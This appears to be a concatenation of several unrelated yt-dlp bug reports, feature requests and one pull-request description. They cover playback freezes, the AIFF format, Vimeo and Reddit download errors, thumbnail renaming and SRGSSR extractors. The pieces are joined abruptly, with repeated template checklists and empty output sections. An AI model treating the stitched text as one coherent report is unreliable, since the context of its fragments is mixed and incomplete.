After downloading I open the video on my mac/ios and i have the audio trace, but video is freezeing. When I open the same downloaded file on Android or Windows everything is fine. Why I have this problem. I tried a lot of solutions, nothing helps. The only way is to reencode file with ffmpeg with this config:

`ffmpeg_cmd = [
      'ffmpeg', '-i', temp_file,
      '-c:v', 'libx264',
      '-preset', 'ultrafast',
      '-crf', '23',
      '-profile:v', 'baseline',
      '-level', '3.1',
      '-pix_fmt', 'yuv420p',
      '-c:a', 'aac',
      '-b:a', '128k',
      '-movflags', '+faststart',
      '-y',
      output_file
  ]`

But this makes downloading process too slow for me. How can I solve it?

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

Due to the new view of comments, which are now [threaded](https://old.reddit.com/r/youtube/comments/1phq388/youtube_threaded_comments_are_now_available_on/), not all comments may be downloaded.
This is currently an A/B test.
This error can be partially resolved by disabling cookies or when the [account does not have the A/B test enabled](https://github.com/user-attachments/assets/f2daeedc-aaca-4334-9506-1f351c7bc3ee).


### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Provide a description that is worded well enough to be understood

Title: Request: Add AIFF as a supported --audio-format
Body:
Hello yt-dlp developers,
I would like to request adding AIFF as a supported output format for --audio-format when using -x / --extract-audio.
Reasons / Use Case:
AIFF is a lossless format, similar in quality to WAV.
Unlike WAV, AIFF supports embedded thumbnails / cover art, which is very useful for audiobooks, Quran recitations, podcasts, and music.
Many users want a lossless format with metadata support that can preserve album art without converting to MP3 or FLAC.
Suggested Behavior:
When --audio-format aiff is specified, yt-dlp would use ffmpeg to convert the audio to AIFF with PCM encoding.
Embedded thumbnails (if --embed-thumbnail is used) should be preserved in the AIFF file.
Thank you for considering this feature!
It would be very useful for users who need high-quality audio with cover art.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

I have noticed that youtube behavior depends on if I use my IPv4 or my IPv6 connection, especially I am typically only getting the cookie error often only either on my v4 or my v6 address, so manually using `--force-ipv6` or `--force-ipv4 `allows me to download content from youtube more frequently. I would be great if yt-dlp could automatically retry a download with v4 if the v6 connections returns an error. 

I have marked this as a generic feature request, as I assume other pages may behave similarly, but I have to admit that I have only seen it on youtube.

### Region

United Kingdom (where it can be accessed in a browser, but not through yt-dlp)

### Provide a description that is worded well enough to be understood

When downloading a video from **v.redd.it** without any credentials, an error occurs: `ERROR: [generic] Unable to download webpage: HTTP Error 403: Blocked (caused by <HTTPError 403: Blocked>)`. An example is given below.

This seems to happen for all **v.redd.it** URLs. I haven't tested if it works with credentials.

(note that in the output below I haven't included the `-U` flag as I update externally from git - however, it's the latest commit, 5f37f67d3)

       Please DO NOT open an issue, unless you have evidence that the video is not DRM protected
like the domain mediasetinfinity.es does, wich i understand will not be fixed as it is DRM protected

will the extractor be fixed for telecinco.es ?

### Region

Israel

### Provide a description that is worded well enough to be understood

Some pages on https://alldaf.org, for example https://alldaf.org/p/240900, do not download properly.
Specifically, it seems it isn't detected as a website using `jwplatform` for its CDN, so its CDN url is handed off to the generic `http downloader`, leaving an `m3u8` file.
If I instead explicitly pass the CDN url (or its `yt-dlp`-smuggled variant) to `yt-dlp`, it instead passes the file to the `hlsnative` extractor, and successfully downloads the resulting `mp3` file (for some reason naming it with an `mp4` extension, but that doesn't much matter)

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

It seems like Vimeo is broken. When trying to download publicly available videos, yt-dlp asks for a login. Even when supplied with cookies, it does not recognize them.

Example videos:
https://vimeo.com/1143265962
https://vimeo.com/1143713788
or any of these https://vimeo.com/watch

What I ran:
`yt-dlp --list-formats ""https://vimeo.com/1143713788"" -vU`
Running it with a cookies.txt from firefox gives the same output
`yt-dlp --cookies ""cookies.txt"" --list-formats ""https://vimeo.com/1143713788"" -vU`

I tried with the same command I used a few weeks ago and they no longer work. I've been able to recreate this with ProtonVPN from various locations. I surmise this is due to a change on the part of Vimeo.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

Fetching metadata for a playlist on archive.org is timing out. After some research I found that the extractor(yt_dlp/extractor/archiveorg.py:282) is using HTTP not HTTPS for the failing request.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [x] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Provide a description that is worded well enough to be understood

The ability to change the file name of whatever `--write-thumbnail` sets would mean that thumbnails could be compliant to naming conventions used by other applications, like media servers such as Jellyfin or PleX without the need for extra processing.

Jellyfin for instance is looking for any JPEG image sitting beside the media file that has the same file name, with the suffix ""-thumb"" to use local thumbnails. EG: ""S01E01 - \<media title\>-thumb.jpg""

\>_dlp when using `--write-thumbnail` will name the file the same as the `-o` argument but with whatever extension is downloaded (or converted using `--convert-thumnbail`). It would be nice if `--write-thumbnail` could take an additional optional set of parameters in order to add your own prefix, or suffix to the current name of the file, before the extension.

---

Conversely, when using the following `--exec` to perform this file rename change myself, it does not work because I believe \>_dlp is adding its own parameters to the executed command.
```shell
--exec ""find . -name \""*.jpg\"" -not -name \""*-thumb.jpg\"" -exec sh -c 'mv \""$1\"" \""${1%.jpg}-thumb.jpg\""' _ {} \;""
```
This command renamed the finished ""*.mp3"" to ""*.mp3-thumb.jpg"" and provides the following output:
>[Exec] Executing command: find . -name ""*.jpg"" -not -name ""*-thumb.jpg"" -exec sh -c 'mv ""$1"" ""${1%.jpg}-thumb.jpg""' _ '/downloads/NA/Season/s--eNA - The Hat Chat Podcast #199 - It'""'""'s coming and we'""'""'re not ready!.mp3' \;
find: ./NA/Season/s--eNA - The Hat Chat Podcast #199 - It's coming and we're not ready!.mp3: No such file or directory
ERROR: Postprocessing: Command returned error code 1

I believe it does this because of this part of the `--exec` command: 
>If no fields are passed, %(filepath,_filename|)q is appended to the end of the command.

I also tried this with the [WHEN:] instruction of `before_dl` to the same issue but this time it happened before the conversion to jpg, which means the `%(filepath,_filename|)q` is still being injected into the --exec command despite me not wanting it to.

I may be mis-understanding the use of `--exec` in which case I believe it needs more examples of how to use it to do things like this, or the feature of being able to add prefixes or suffixes to file names of certain additional downloads (like the .info.json) will be a very useful idea.

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

### Please make sure the question is worded well enough to be understood

Hello. Since two days ago, after a nightly update, I sometimes see the following message in my server logs:

WARNING: [youtube] [pot:bgutil:http] Error reaching GET http://127.0.0.1:4416/ping (caused by TransportError). Please make sure that the server is reachable at http://127.0.0.1:4416.


I have a Telegram bot, and this issue has caused problems for me.
How can I fix this problem?
Why is there a request to bgutil, even though this issue didn’t exist before the update?

I would appreciate your help.

### Provide verbose output that clearly demonstrates the problem

- [ ] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [ ] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

UK

### Provide a description that is worded well enough to be understood

I have checked and I can access this video using the same IP and account but through yt-dlp it fails, have also tried a different IP and different account with the same issue. Any support on things I could try to sort this would be appreciated.

### Region

Irrelevant tested multiple regions

### Provide a description that is worded well enough to be understood

Currently, using the following arguments for live streams cause yt-dlp to fail to get any formats. removing cookies make it work, and removing the `--live-from-start` also make it work with cookies. I provided both outputs for 



### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
- [x] Copy the WHOLE output (starting with `[debug] Command-line config`) and insert it below

### Complete Verbose Output

```

    PLEASE AVOID FORCE-PUSHING after opening a PR, as it makes reviewing more difficult.

### Description of your *pull request* and other information

### Short description
SRF, RTS, RSI, RTR, and SWI (which all fall under SRGSSR) have changed URL formats causing download to fail for a large number of subpages. This includes both:
- the media library, accessible under ""play"", e.g. ```srf.ch/play/...``` (urls like play.srf.ch have moved to this)
- and the articles (like /news /sport /audio) which contain text + embedded media content

There are now 3 extractors (previously 2, separated out the one for article type pages):
SRGSSRIE (for URNs/UUIDs), SRGSSRPlayIE (for /play), SRGSSRArticleIE (for articles with embeds)

Also added > 20 tests (passed)

Fixes #6407 

### Detailed description
#### SRGSSRIE
- Base extractor that handles URN-format URLs and communicates with the official SRGSSR Integration Layer API (`il.srgssr.ch/integrationlayer/2.0/`)
- Had to update regex and add URN support 
- both UUID `urn:srf:video:<UUID>` and numeric URNs `urn:swisstxt:video:srf:<123>` are supported.

#### SRGSSRArticleIE (new)
- this retrieves embedded media from article pages across all the SRGSSR sites.
- supports URLs such as /news, /sport, /audio, /novitads, /archives, /emissions, etc.
- searches for audio/video URNs embedded in the webpage HTML (retrieved through `_download_webpage()` of `common.py`). URN is then passed to SRGSSRIE.

#### SRGSSRPlayIE
- this used to be for the `play.srf.ch` subdomains but has now moved to /play instead
- supports /play URLs with ?id= or ?urn=<URN> parameters. Converts these to the appropriate URN format, then also delegates to SRGSSRIE.

#### Other changes
I have taken the liberty to remove the srt.py extractor as it was
- directly dependent on SRGSSR (through class inheritance)
- already marked as not working
- all the domains that were included in the tests of that extractor work again, I added them as tests here to make sure

### Tests:
I've included >10 different tests for both the article and play extractor, hopefully covering most common URL patterns. All the tests passed on my machine.

Test URLs were handpicked, included most from the previous version (or the redirects they now point to), and some new ones added.

I haven't exhausted every single combination of subpages so there might still be some niche URLs not covered, but this PR should fix downloads for all of the common page types across the SRGSSR pages.

### Provide a description that is worded well enough to be understood

The `--postprocessor-args ""ffmpeg_i:-fflags +genpts+igndts""` arguments are not honored and some downloaded files which have timestamp issues are not smooth/out of sync? (kinda lagging)

On Mac I'm not able to install the nightly build, however I did install the HEAD version.
`brew install --HEAD yt-dlp`

The workaround is to use the following arguments with yt-dlp, which comes with it's own caveats (no dash):
 
```
--downloader ""ffmpeg"" 
--external-downloader-args ""ffmpeg_i:-fflags +genpts+igndts"" 
```

Full command from my bash script:
```
    yt-dlp -vU ""$full_link"" \
        --audio-multistreams -f \
        ""(bv[vcodec*=avc1]+ba+mergeall)[protocol^=m3u8] / \
        (bv[vcodec*=av01]+ba+mergeall)[protocol^=m3u8] / \
        (bv[vcodec*=hev1]+ba+mergeall)[protocol^=m3u8]"" \
        --merge-output-format mkv \
        --postprocessor-args ""ffmpeg_i:-fflags +genpts+igndts"" \
        --output ""$output""
```

### Provide verbose output that clearly demonstrates the problem

- [x] Run **your** yt-dlp command with **-vU** flag added (`yt-dlp -vU <your command line>`)
- [ ] If using API, add `'verbose': True` to `YoutubeDL` params instead
